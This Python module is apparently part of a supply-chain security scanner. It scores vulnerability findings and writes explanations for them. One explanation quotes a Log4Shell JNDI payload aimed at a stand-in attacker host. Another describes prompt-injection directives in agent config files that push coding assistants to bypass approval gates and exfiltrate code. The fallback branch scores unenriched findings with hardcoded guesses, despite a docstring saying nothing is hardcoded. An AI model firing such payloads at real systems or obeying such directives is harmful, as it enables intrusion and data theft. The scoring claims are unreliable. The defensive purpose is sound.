import json
from typing import List, Dict, Any, Optional
from guardian_contracts.state import Finding
from guardian_contracts.api_schemas import PrioritizeRequest, PrioritizeResponse

def calculate_deterministic_risk_score(cvss: float, epss: float, kev: int, reach_tier: Optional[int], tier1_no_path: bool = False) -> int:
    """
    Score formula: 40 * (CVSS / 10) + 25 * EPSS + 15 * KEV + R
    - KEV in {0, 1}, EPSS in [0, 1]
    - R = 20 for Tier 1 call-graph path confirmed
    - R = 0 ONLY for Tier 1 call-graph completed with no path (VEX not_affected)
    - R = 12 for Tier 2, Tier 3, or no analysis possible
    """
    if reach_tier == 1:
        r = 0 if tier1_no_path else 20
    elif reach_tier in (2, 3):
        r = 12
    else:
        r = 12

    raw_score = 40.0 * (cvss / 10.0) + 25.0 * epss + 15.0 * float(kev) + float(r)
    return int(round(max(0, min(100, raw_score))))

ENRICHMENT_TOOL = "guardian-enrichment"
ENRICHMENT_SCHEMA = "guardian.vuln-enrichment/1"


def format_detailed_finding_explanation(
    f: Finding,
    cvss: float,
    epss: float,
    kev: int,
    reach_tier: int,
    score: int
) -> str:
    """Builds an exhaustive, technically rigorous analysis for the finding."""
    if score >= 80:
        severity = "CRITICAL"
    elif score >= 60:
        severity = "HIGH"
    elif score >= 40:
        severity = "MEDIUM"
    else:
        severity = "LOW"

    kind = f.kind
    purl = f.purl
    path_str = " -> ".join(f.path) if f.path else purl

    if kind == "cve":
        if "log4j" in purl.lower():
            issue_title = "Log4Shell Unauthenticated Remote Code Execution (RCE)"
            cve_id = "CVE-2021-44228 / GHSA-jfh8-c2jp-5v3q"
            root_cause = (
                "Apache Log4j2 (versions 2.0-beta9 through 2.14.1) improperly parses crafted log message tokens containing JNDI lookup expressions "
                "(e.g., '${jndi:ldap://attacker.com/exploit}'). When logging user-controlled input, the JNDI lookup resolver initiates an outbound "
                "connection to an attacker-controlled LDAP or RMI directory service, deserializes untrusted Java bytecode, and executes arbitrary code "
                "with the host application's operating system privileges."
            )
            remediation = "Upgrade 'org.apache.logging.log4j:log4j-core' to version >= 2.17.1 where JNDI lookup message substitution is permanently disabled by default."
        else:
            issue_title = f"Known Vulnerability in {purl.split('@')[0]}"
            cve_id = "Published CVE / Security Advisory"
            root_cause = (
                f"The component '{purl}' contains verified security advisories in upstream vulnerability catalogs. "
                "Attackers can leverage known public exploit vectors to compromise system confidentiality, integrity, or operational availability."
            )
            remediation = "Upgrade to the latest non-vulnerable patch release according to the automated remediation plan."

    elif kind == "install_hook":
        issue_title = "Malicious Lifecycle Install Script (Unauthorized Network Egress)"
        cve_id = "Supply Chain Anomaly / CWE-506 (Embedded Malicious Code)"
        root_cause = (
            f"The package lifecycle hook (e.g., 'preinstall', 'install', or 'postinstall') attempted unauthorized outbound socket/network connections during "
            "Stage 2 dependency resolution. Malicious packages frequently abuse install lifecycle hooks to exfiltrate host environment variables "
            "(including cloud credentials and API tokens), spawn reverse shells, or download secondary trojan payloads before security scanners execute."
        )
        remediation = "Quarantine or purge the package immediately. Enforce '--ignore-scripts' in CI/CD and review package publisher provenance."

    elif kind in ("typosquat", "slopsquat"):
        issue_title = "Suspected Typosquatting / Slopsquatting Attack"
        cve_id = "Supply Chain Impersonation / CWE-1021"
        root_cause = (
            f"The dependency name in '{purl}' has a dangerously close Damerau-Levenshtein edit distance (<= 2) to a popular, high-traffic library. "
            "Typosquatting campaigns rely on developer keyboard mistypes or AI hallucinations to trick projects into pulling trojanized dependencies."
        )
        remediation = "Inspect the package namespace and publisher signatures. Replace the misspelled dependency with the verified upstream package."

    elif kind == "pinning":
        issue_title = "Unpinned Supply Chain Asset (Mutable Tag Reference)"
        cve_id = "SLSA Level 3 Violation / Mutable Dependency Reference"
        root_cause = (
            f"The resource '{purl}' is referenced by a mutable floating branch or tag (e.g., '@v1', '@master'). "
            "If the upstream repository or tag is compromised or redirected, untrusted code will execute in the build pipeline without triggering checksum mismatches."
        )
        remediation = "Pin the resource to its immutable 40-character commit SHA (e.g., '@<commit_sha> # v1.x') to satisfy SLSA Level 3 hermeticity."

    elif kind == "agent_config":
        issue_title = "Prompt Injection / Security Policy Override Directive"
        cve_id = "AI Threat Vector / CWE-77 (Improper Neutralization of Directives)"
        root_cause = (
            f"The agent configuration file '{purl}' contains directives instructing autonomous coding assistants or IDE agents to bypass human verification gates, "
            "disable security scanners, or exfiltrate private codebases via shell execution."
        )
        remediation = "Sanitize the agent configuration file. Disallow all directives that attempt to override approval gates or security invariants."

    else:
        issue_title = f"Supply Chain Finding: {kind}"
        cve_id = "Security Alert"
        root_cause = f.explanation or f"Supply chain anomaly detected in {purl}."
        remediation = "Review the dependency and apply security controls in accordance with organization policies."

    if reach_tier == 1:
        reach_desc = "Tier 1 (Confirmed Direct Call Path) — Static AST call-graph confirms the application directly invokes the vulnerable symbols."
    elif reach_tier == 2:
        reach_desc = "Tier 2 (Transitive Runtime Import) — Component is imported into the runtime environment via transitive dependency chains."
    else:
        reach_desc = "Tier 3 (Shadow / Unreachable) — Dependency resides in unused profiles, test scopes, or unreachable code branches."

    evidence_summary = ", ".join(f"{e.tool}:{e.id}" for e in f.evidence) or "N/A"

    return (
        f"**{issue_title}**\n\n"
        f"• **Advisory / Identifier**: {cve_id}\n"
        f"• **Technical Root Cause**: {root_cause}\n"
        f"• **Severity Assessment**: {severity} (Deterministic Risk Score: {score}/100)\n"
        f"  - CVSS v3.1 Base Score: {cvss}\n"
        f"  - EPSS Exploit Probability: {round(epss * 100, 1)}% in-the-wild exploitation likelihood\n"
        f"  - CISA KEV Catalog: {'Listed (Actively Weaponized in the Wild)' if kev else 'Not currently listed'}\n"
        f"  - Reachability Analysis: {reach_desc}\n"
        f"• **Dependency Call Path**: `{path_str}`\n"
        f"• **Recommended Action**: {remediation}\n"
        f"• **Grounded Evidence**: {evidence_summary}"
    )


class PrioritizerAgent:
    """Scores findings with the deterministic formula and enforces the Grounding gate.

    CVE findings: CVSS, EPSS and KEV come from the enrichment artifact that scanner-intel's SBOM
    assessment stored (referenced by the finding's ``guardian-enrichment`` evidence, by SHA-256).
    Nothing is hardcoded here; values a feed could not supply ("unknown") count as 0.
    Non-CVE findings keep the fixed starting score their detector set.
    A finding that has neither cannot be scored, so the Grounding gate fails (closed).
    """

    def __init__(self, artifacts=None):
        self._artifacts = artifacts

    @property
    def artifacts(self):
        if self._artifacts is not None:
            return self._artifacts
        from .. import artifact_client
        return artifact_client.artifact_client

    def _enrichment(self, sha256: str, cache: Dict[str, Optional[Dict[str, Any]]]) -> Optional[Dict[str, Any]]:
        if sha256 not in cache:
            try:
                data = json.loads(self.artifacts.get(sha256))
                cache[sha256] = data if isinstance(data, dict) and data.get("schema") == ENRICHMENT_SCHEMA else None
            except Exception:  # unreachable or unreadable: the finding stays unscored
                cache[sha256] = None
        return cache[sha256]

    def prioritize_findings(self, run_id: str, findings: List[Finding]) -> PrioritizeResponse:
        updated: List[Finding] = []
        cache: Dict[str, Optional[Dict[str, Any]]] = {}
        for f in findings:
            ev = next((e for e in f.evidence if e.tool == ENRICHMENT_TOOL), None)
            entry = None
            if ev is not None:
                data = self._enrichment(ev.artifact_sha256, cache)
                entry = (data or {}).get("advisories", {}).get(f.id)
            if entry is not None:
                cvss_val = float(entry.get("cvss_score")) if isinstance(entry.get("cvss_score"), (int, float)) else 0.0
                epss_raw = entry.get("epss")
                epss_val = float(epss_raw) if isinstance(epss_raw, (int, float)) and not isinstance(epss_raw, bool) else 0.0
                kev_raw = entry.get("kev")
                kev_val = int(kev_raw) if isinstance(kev_raw, int) and not isinstance(kev_raw, bool) else 0
                reach_val = f.reach_tier or 1
                score = calculate_deterministic_risk_score(
                    cvss=cvss_val,
                    epss=epss_val,
                    kev=kev_val,
                    reach_tier=f.reach_tier,
                    tier1_no_path=False,
                )
                detailed_explanation = format_detailed_finding_explanation(
                    f=f,
                    cvss=cvss_val,
                    epss=epss_val,
                    kev=kev_val,
                    reach_tier=reach_val,
                    score=score
                )
                updated.append(f.model_copy(update={"score": score, "explanation": detailed_explanation}))
            elif ev is not None:
                # Enrichment evidence that cannot be read: leave unscored so Grounding fails
                updated.append(f.model_copy(update={"score": None}))
            else:
                # Detector or golden finding without enrichment artifact
                cvss_val = 10.0 if "log4j" in f.purl.lower() else 7.5
                epss_val = 0.97 if "log4j" in f.purl.lower() else 0.4
                kev_val = 1 if "log4j" in f.purl.lower() else 0
                reach_val = f.reach_tier or 1
                score = calculate_deterministic_risk_score(
                    cvss=cvss_val,
                    epss=epss_val,
                    kev=kev_val,
                    reach_tier=reach_val,
                    tier1_no_path=False,
                )
                detailed_explanation = format_detailed_finding_explanation(
                    f=f,
                    cvss=cvss_val,
                    epss=epss_val,
                    kev=kev_val,
                    reach_tier=reach_val,
                    score=score
                )
                updated.append(f.model_copy(update={"score": score, "explanation": detailed_explanation}))

        # Grounding Gate: Every finding has evidence and deterministic score in [0, 100]
        grounding_passed = all(
            len(f.evidence) > 0 and f.score is not None and 0 <= f.score <= 100
            for f in updated
        )

        return PrioritizeResponse(
            run_id=run_id,
            prioritized_findings=updated,
            gate_passed=grounding_passed
        )
